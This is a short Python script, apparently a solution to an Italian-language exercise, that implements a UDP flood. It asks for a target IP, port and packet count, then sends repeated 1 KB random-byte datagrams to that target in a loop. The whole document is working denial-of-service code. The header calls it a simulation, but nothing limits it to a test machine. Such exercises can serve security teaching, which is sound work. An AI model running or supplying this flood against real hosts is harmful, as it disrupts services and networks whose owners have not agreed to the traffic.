# Scrivere un programma in Python che simuli un UDP flood, 
# ovvero l’invio massivo di richieste UDP verso una macchina
# target che è in ascolto su una porta UDP casuale

import socket

# Modulo random per la generazione di byte casuali
import random

# Richiesta di inserimento dell'IP target
ip_target = input("Inserisci l'IP target: ")

# Richiesta di inserimento della porta target
porta_target = int(input("Inserisci la porta target: "))

# Creazione di un socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generazione di un pacchetto di 1 KB
pacchetto = bytes([random.randint(0, 255) for _ in range(1024)])

# Richiesta del numero di pacchetti da 1 KB da inviare
n_pacchetti = int(input("Quanti pacchetti da 1 KB vuoi inviare? "))

# Invio dei pacchetti
for i in range(n_pacchetti):
    sock.sendto(pacchetto, (ip_target, porta_target))
    print(f"Pacchetto {i+1} inviato!")

print("Invio dei pacchetti completato!")

# Questo programma richiede all'utente di inserire l'IP target 
# e la porta target, quindi genera un pacchetto di 1 KB 
# utilizzando il modulo random per generare byte casuali. 
# Infine, richiede all'utente di inserire il numero di 
# pacchetti da inviare e li invia utilizzando il socket UDP creato.